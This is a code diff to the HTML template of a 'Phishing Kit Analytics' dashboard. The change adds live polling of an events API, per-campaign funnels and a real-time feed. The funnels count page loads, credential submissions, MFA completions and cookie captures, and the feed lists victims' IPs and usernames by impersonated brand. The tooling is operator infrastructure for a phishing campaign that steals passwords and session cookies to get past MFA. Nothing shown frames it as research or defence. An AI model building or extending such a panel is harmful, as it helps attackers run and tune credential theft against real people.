@@ -3,7 +3,6 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta http-equiv="refresh" content="30">
 <title>Phishing Kit — Analytics</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -24,15 +23,36 @@
   .badge-fail { background: #3a0312; color: #f85149; }
   .badge-capture { background: #0c2d6b; color: #58a6ff; }
   .badge-proxy { background: #2e0c6b; color: #bc8cff; }
+  .badge-page_load { background: #1b212c; color: #8b949e; }
+  .badge-credential_submit { background: #1a2e1a; color: #7ee787; }
+  .badge-mfa_complete { background: #0c2d6b; color: #58a6ff; }
+  .badge-cookie_capture { background: #2e0c6b; color: #bc8cff; }
   .mono { font-family: "SF Mono", "Fira Code", monospace; font-size: 0.75rem; }
   .footer { margin-top: 24px; font-size: 0.7rem; color: #484f58; border-top: 1px solid #21262d; padding-top: 12px; }
   .empty { color: #484f58; font-style: italic; padding: 20px 0; }
+
+  /* Funnel progress bar */
+  .funnel-bar { display: flex; height: 20px; border-radius: 4px; overflow: hidden; background: #161b22; border: 1px solid #30363d; min-width: 120px; }
+  .funnel-bar .seg { transition: width 0.3s; }
+  .funnel-bar .seg-page_loads { background: #30363d; }
+  .funnel-bar .seg-credential_submit { background: #2ea043; }
+  .funnel-bar .seg-mfa_complete { background: #1f6feb; }
+  .funnel-bar .seg-cookie_capture { background: #8250df; }
+
+  /* Recent activity feed */
+  #recent-feed { max-height: 400px; overflow-y: auto; }
+  .feed-item { padding: 6px 8px; border-bottom: 1px solid #21262d; font-size: 0.78rem; display: flex; align-items: center; gap: 10px; }
+  .feed-item .ts { color: #484f58; font-family: "SF Mono", "Fira Code", monospace; font-size: 0.7rem; white-space: nowrap; }
+  .feed-item .detail { color: #8b949e; }
+
+  .live-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: #3fb950; margin-right: 6px; animation: pulse 2s infinite; }
+  @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
 </style>
 </head>
 <body>
-<h1>Phishing Kit Analytics</h1>
+<h1><span class="live-dot" id="live-dot"></span>Phishing Kit Analytics</h1>
 
-<div class="summary">
+<div class="summary" id="summary-cards">
   <div class="card">
     <div class="label">Total Events</div>
     <div class="value">{{.Total}}</div>
@@ -52,30 +72,43 @@
   </div>
 </div>
 
-<h2>Campaigns</h2>
-{{if .Campaigns}}
+<h2>Campaign Funnels</h2>
+{{if .Funnels}}
 <table>
   <thead>
     <tr>
       <th>Campaign ID</th>
       <th>Brand</th>
-      <th>Events</th>
-      <th>Success</th>
-      <th>Failed</th>
+      <th>Page Loads</th>
+      <th>Creds</th>
+      <th>MFA</th>
+      <th>Captured</th>
       <th>Rate</th>
-      <th>Last Seen</th>
+      <th>Funnel</th>
     </tr>
   </thead>
   <tbody>
-  {{range .Campaigns}}
+  {{$maxLoads := 0}}
+  {{range .Funnels}}
+    {{if gt .PageLoads $maxLoads}}{{/*template*/}}{{end}}
+  {{end}}
+  {{range .Funnels}}
     <tr>
       <td class="mono">{{.CampaignID}}</td>
       <td>{{.Brand}}</td>
-      <td>{{.Total}}</td>
-      <td><span class="badge badge-success">{{.Successes}}</span></td>
-      <td><span class="badge badge-fail">{{.Failures}}</span></td>
-      <td>{{printf "%.0f" .Rate}}%</td>
-      <td class="mono">{{.LastSeen}}</td>
+      <td>{{.PageLoads}}</td>
+      <td><span class="badge badge-credential_submit">{{.CredSubmits}}</span></td>
+      <td><span class="badge badge-mfa_complete">{{.MfaCompletes}}</span></td>
+      <td><span class="badge badge-cookie_capture">{{.CookieCaptures}}</span></td>
+      <td>{{printf "%.0f" .SuccessRate}}%</td>
+      <td>
+        <div class="funnel-bar" title="PL:{{.PageLoads}} CR:{{.CredSubmits}} MFA:{{.MfaCompletes}} CC:{{.CookieCaptures}}">
+          {{$pl := .PageLoads}}{{if gt $pl 0}}<div class="seg seg-page_loads" style="flex: {{$pl}}"></div>{{end}}
+          {{$cr := .CredSubmits}}{{if gt $cr 0}}<div class="seg seg-credential_submit" style="flex: {{$cr}}"></div>{{end}}
+          {{$mf := .MfaCompletes}}{{if gt $mf 0}}<div class="seg seg-mfa_complete" style="flex: {{$mf}}"></div>{{end}}
+          {{$cc := .CookieCaptures}}{{if gt $cc 0}}<div class="seg seg-cookie_capture" style="flex: {{$cc}}"></div>{{end}}
+        </div>
+      </td>
     </tr>
   {{end}}
   </tbody>
@@ -108,38 +141,97 @@
 <p class="empty">No IP data yet.</p>
 {{end}}
 
-<h2>Recent Events</h2>
+<h2>Recent Activity <span style="font-weight:400;font-size:0.7rem;color:#484f58;" id="poll-status">live</span></h2>
+<div id="recent-feed">
 {{if .Recent}}
-<table>
-  <thead>
-    <tr>
-      <th>Time</th>
-      <th>Campaign</th>
-      <th>Brand</th>
-      <th>IP</th>
-      <th>Username</th>
-      <th>Status</th>
-      <th>Source</th>
-    </tr>
-  </thead>
-  <tbody>
-  {{range .Recent}}
-    <tr>
-      <td class="mono">{{.Timestamp}}</td>
-      <td class="mono">{{.CampaignID}}</td>
-      <td>{{.Brand}}</td>
-      <td class="mono">{{.IP}}</td>
-      <td>{{.Username}}</td>
-      <td>{{if eq .Status "success"}}<span class="badge badge-success">success</span>{{else}}<span class="badge badge-fail">failed</span>{{end}}</td>
-      <td>{{if eq .Source "proxy"}}<span class="badge badge-proxy">proxy</span>{{else}}<span class="badge badge-capture">capture</span>{{end}}</td>
-    </tr>
-  {{end}}
-  </tbody>
-</table>
+{{range .Recent}}
+  <div class="feed-item">
+    <span class="ts">{{.Timestamp}}</span>
+    <span class="badge badge-{{.EventType}}">{{.EventType}}</span>
+    <span class="mono">{{.CampaignID}}</span>
+    <span>{{.Brand}}</span>
+    <span class="mono">{{.IP}}</span>
+    <span class="detail">{{.Username}}</span>
+  </div>
+{{end}}
 {{else}}
 <p class="empty">No events yet.</p>
 {{end}}
+</div>
 
-<div class="footer">Generated {{.GeneratedAt}} &middot; Auto-refreshes every 30s</div>
+<div class="footer" id="footer-info">Generated {{.GeneratedAt}} &middot; Live polling every 10s</div>
+</div>
+
+<script>
+(function(){
+  var since = new Date().toISOString();
+  var statusEl = document.getElementById('poll-status');
+  var feedEl = document.getElementById('recent-feed');
+  var dotEl = document.getElementById('live-dot');
+
+  function poll() {
+    statusEl.textContent = 'polling...';
+    fetch('/api/events?since=' + encodeURIComponent(since))
+      .then(function(r) {
+        if (!r.ok) throw new Error('status ' + r.status);
+        return r.json();
+      })
+      .then(function(data) {
+        statusEl.textContent = 'live';
+        if (!data || !data.Recent || data.Recent.length === 0) return;
+
+        // Update summary cards
+        var sc = document.getElementById('summary-cards');
+        if (sc && data.Total !== undefined) {
+          sc.innerHTML =
+            '<div class="card"><div class="label">Total Events</div><div class="value">' + data.Total + '</div></div>' +
+            '<div class="card"><div class="label">Success Rate</div><div class="value">' + (data.SuccessRate || 0).toFixed(1) + '%</div><div class="sub">captured / total</div></div>' +
+            '<div class="card"><div class="label">Unique IPs</div><div class="value">' + (data.UniqueIPs || 0) + '</div></div>' +
+            '<div class="card"><div class="label">Active Campaigns</div><div class="value">' + (data.ActiveCampaigns || 0) + '</div></div>';
+        }
+
+        // Prepend new events to feed (newest first)
+        var recents = data.Recent || [];
+        for (var i = recents.length - 1; i >= 0; i--) {
+          var ev = recents[i];
+          var div = document.createElement('div');
+          div.className = 'feed-item';
+          div.innerHTML =
+            '<span class="ts">' + esc(ev.timestamp) + '</span>' +
+            '<span class="badge badge-' + esc(ev.event_type) + '">' + esc(ev.event_type) + '</span>' +
+            '<span class="mono">' + esc(ev.campaign_id) + '</span>' +
+            '<span>' + esc(ev.brand) + '</span>' +
+            '<span class="mono">' + esc(ev.ip) + '</span>' +
+            '<span class="detail">' + esc(ev.username) + '</span>';
+          feedEl.insertBefore(div, feedEl.firstChild);
+        }
+
+        // Keep only last 50 items
+        while (feedEl.children.length > 50) {
+          feedEl.removeChild(feedEl.lastChild);
+        }
+
+        if (recents.length > 0) {
+          since = recents[recents.length - 1].timestamp;
+        }
+
+        // Update footer
+        var footer = document.getElementById('footer-info');
+        if (footer && data.GeneratedAt) {
+          footer.textContent = 'Generated ' + data.GeneratedAt + ' · Live polling every 10s';
+        }
+      })
+      .catch(function(err) {
+        statusEl.textContent = 'error: ' + err.message;
+      });
+  }
+
+  function esc(s) { return (s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+
+  // Initial data already rendered server-side; start polling for deltas
+  dotEl.style.display = 'inline-block';
+  setInterval(poll, 10000);
+})();
+</script>
 </body>
 </html>
